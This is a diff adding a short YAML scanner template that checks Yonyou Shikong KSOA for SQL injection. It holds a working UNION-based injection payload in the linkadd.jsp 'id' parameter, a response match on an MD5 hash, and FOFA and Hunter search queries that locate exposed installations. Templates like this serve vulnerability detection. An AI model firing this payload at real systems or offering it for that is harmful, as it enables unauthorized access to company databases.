@@ -1,0 +1,16 @@
+name: yonyouKSOA-sqli       
+rules: 
+  - method: GET   
+    path: /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27123456%27%29%29%2Cnull%2Cnull%2C%27
+    headers:
+    body:            
+    expression:                        
+      status_code:                
+      response_header:              
+      response_body: e10adc3949
+
+detail:                          
+  description: "用友时空KSOA是一款专业的企业应用集成平台，可整合企业各种信息系统和业务系统，帮助企业快速了解业务状态和动态。 通过用友时空KSOA，企业可以通过自定义关键业务指标，实时监控各系统和业务状态，并通过分析工具优化业务管理和决策支持模式。截至到2024.5.28有部分网站存在该漏洞"
+  search:             
+    fofa: app="用友-时空KSOA"
+    鹰图: web.body="/images_index/productKSOA.jpg" or web.title="企业信息系统门户"
